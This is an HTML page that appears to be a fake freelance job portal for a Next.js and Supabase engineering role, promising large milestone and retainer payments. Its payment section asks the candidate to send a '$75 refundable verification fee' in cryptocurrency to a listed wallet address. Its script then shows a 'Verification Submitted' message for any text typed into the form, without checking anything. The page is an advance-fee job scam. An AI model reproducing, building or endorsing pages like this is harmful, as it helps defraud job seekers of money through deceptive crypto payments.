<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Architecture & Workspace Provisioning</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-[#0b0f19] text-[#f3f4f6] p-6 md:p-12 font-sans">

    <div class="max-w-3xl mx-auto bg-[#111827] border border-[#1f2937] rounded-xl p-6 md:p-8 shadow-2xl">
        
        <!-- Header -->
        <div class="border-b border-[#1f2937] pb-6 mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
                <h1 class="text-xl font-bold tracking-tight">Enterprise Architecture & Workspace Provisioning</h1>
                <p class="text-gray-400 text-sm mt-1">Session ID: <strong class="text-gray-200">ENG-MIG-7842X</strong></p>
            </div>
            <span class="bg-blue-950/60 border border-blue-800/50 text-blue-400 px-3 py-1 rounded-full text-xs font-medium w-fit">
                Next.js App Router &bull; Supabase Stack
            </span>
        </div>

        <!-- Candidate Profile Section -->
        <div class="mb-6">
            <h2 class="text-lg font-semibold mb-3">Assigned Candidate Profile</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-gray-300 mb-3">
                <p><strong>Role:</strong> Full-Stack & Data Migration Engineer</p>
                <p><strong>Experience:</strong> 5 Years Full-Stack Development</p>
            </div>
            <div class="flex flex-wrap gap-2">
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">Next.js (App Router)</span>
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">Tailwind CSS</span>
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">TypeScript</span>
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">Supabase / PostgreSQL</span>
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">Prisma / Drizzle</span>
                <span class="bg-[#374151] text-[#9ca3af] px-2.5 py-1 rounded-md text-xs font-medium">dnd-kit</span>
            </div>
        </div>

        <!-- Project Scope & Tech Stack Terms -->
        <div class="mb-6">
            <h2 class="text-lg font-semibold mb-3">Project Scope & Architecture Specifications</h2>
            <p class="text-sm text-gray-300 leading-relaxed mb-4">
                Scaling a high-concurrency Next.js frontend coupled with a Supabase/PostgreSQL backend utilizing Row Level Security (RLS), real-time Kanban task boards via <code class="text-blue-400 bg-gray-900 px-1 py-0.5 rounded">dnd-kit</code>, and optimized cloud storage integration.
            </p>
            <div class="bg-[#1f2937] p-4 rounded-lg border border-gray-800 space-y-2 text-sm">
                <div class="flex justify-between items-center">
                    <span class="text-gray-400">Phase 1 (Evaluation Sprint - 2 Weeks):</span>
                    <span class="font-semibold text-green-400">$3,500.00 USD</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-400">Phase 2 (Recurring Retainer):</span>
                    <span class="font-semibold text-green-400">$6,500.00 / month</span>
                </div>
            </div>
        </div>

        <!-- Escrow & Verification Breakdown -->
        <div class="mb-6">
            <h2 class="text-lg font-semibold mb-3">Escrow & Compliance Ledger</h2>
            <div class="bg-[#1f2937] p-4 rounded-lg border border-gray-800 space-y-2 text-sm">
                <p class="flex justify-between">
                    <span class="text-gray-400">Client Escrow Stake Locked:</span> 
                    <span class="text-emerald-400 font-bold">$1,500.00 USD</span>
                </p>
                <p class="flex justify-between">
                    <span class="text-gray-400">Network & Verification Allocation Fee:</span> 
                    <span class="text-rose-400 font-bold">$75.00 USD equivalent</span>
                </p>
                <p class="text-xs text-gray-400 mt-2 pt-2 border-t border-gray-700/50">
                    *Note: The allocation fee is fully refundable and automatically returned alongside your Phase 1 milestone payout.
                </p>
            </div>
        </div>

        <!-- Payment & Provisioning Gateway -->
        <div class="border-t border-[#1f2937] pt-6">
            <div class="flex items-center justify-between mb-2">
                <h2 class="text-lg font-semibold">Complete Verification Transfer</h2>
                <span class="bg-orange-950/60 border border-orange-800/50 text-orange-400 px-2.5 py-0.5 rounded text-xs font-medium">
                    MetaMask / EVM Wallet
                </span>
            </div>
            <p class="text-sm text-gray-300 mb-4">
                Send exactly <strong class="text-white">$75.00 USD</strong> equivalent in stablecoin/ETH via MetaMask to the designated escrow address below:
            </p>
            
            <div class="bg-[#374151] p-3 rounded-lg font-mono text-blue-400 text-sm break-all select-all border border-gray-600 mb-4">
                0x71C3b29A8849b28bE48f69B371fD6839e564B521
            </div>
            
            <form id="verifyForm" onsubmit="handleVerify(event)" class="space-y-4">
                <div>
                    <label class="block text-xs font-medium text-gray-400 mb-1">
                        Paste MetaMask Transaction Hash (TXID) after transfer:
                    </label>
                    <input 
                        type="text" 
                        id="txIdInput"
                        placeholder="0x..." 
                        required
                        class="w-full px-3 py-2 bg-[#374151] border border-gray-600 text-white rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"
                    >
                </div>

                <button 
                    type="submit" 
                    id="submitBtn"
                    class="w-full bg-blue-600 hover:bg-blue-700 transition-colors text-white font-semibold py-2.5 px-4 rounded-md text-sm shadow-md cursor-pointer"
                >
                    Verify & Provision Workspace
                </button>
            </form>

            <div id="successMsg" class="hidden mt-4 p-3 bg-emerald-950/50 border border-emerald-800/50 rounded-lg text-emerald-400 text-xs text-center">
                Transaction hash received. Provisioning Supabase RLS instances and Next.js workspace pipelines...
            </div>
        </div>

    </div>

    <script>
        function handleVerify(e) {
            e.preventDefault();
            const txId = document.getElementById('txIdInput').value.trim();
            if (txId) {
                document.getElementById('submitBtn').innerText = 'Verification Submitted Successfully ✓';
                document.getElementById('successMsg').classList.remove('hidden');
            }
        }
    </script>
</body>
</html>
